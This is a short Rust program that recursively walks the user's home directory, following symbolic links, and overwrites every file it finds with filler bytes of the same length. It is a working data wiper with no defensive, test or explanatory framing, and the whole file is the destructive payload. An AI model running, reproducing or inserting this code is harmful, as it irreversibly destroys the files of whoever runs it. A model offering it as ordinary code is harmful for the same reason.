use std::env;
use walkdir::WalkDir;
use std::fs;

fn main() -> std::io::Result<()> {
    let home_path = env::var_os("USERPROFILE").unwrap(); // HOME for Linux; USERPROFILE for Windows
    
    const OVERWRITE_DATA: u8 = 1;

    for entry in WalkDir::new(home_path)
        .follow_links(true)
        .into_iter()
        .filter_map(|e| e.ok()) {
            if entry.metadata().unwrap().is_file() {
                let the_file: String = entry.path().display().to_string();
                let the_actual_file: String = entry.path().display().to_string();
                let file_metadata = fs::metadata(the_file).unwrap();
                let file_size: usize = file_metadata.len().try_into().unwrap();
                fs::write(the_actual_file, vec![OVERWRITE_DATA; file_size]).expect("Something went wrong while over-writing the file!");
            }
        }
    Ok(())
}
